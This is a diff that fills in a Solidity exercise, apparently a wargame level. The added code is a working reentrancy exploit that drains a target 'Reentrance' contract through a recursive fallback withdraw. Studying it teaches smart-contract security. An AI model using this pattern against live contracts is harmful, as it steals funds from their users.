@@ -8,8 +8,19 @@ contract AttackingReentrance {
     constructor(address payable _contractAddress) payable {
         contractAddress = _contractAddress;
     }
-
+    // make a donation then immedietly withdraw
+    // create a fallback that recursively withdraws
+    // profit
     function hackContract() external {
-        // Code me!
+        Reentrance ogContract = Reentrance(contractAddress);
+        ogContract.donate{value: address(this).balance}(address(this));
+        ogContract.withdraw();
+    }
+
+    fallback() external payable {
+        Reentrance ogContract = Reentrance(contractAddress);
+        if (contractAddress.balance > 0) {
+            ogContract.withdraw();
+        }
     }
 }
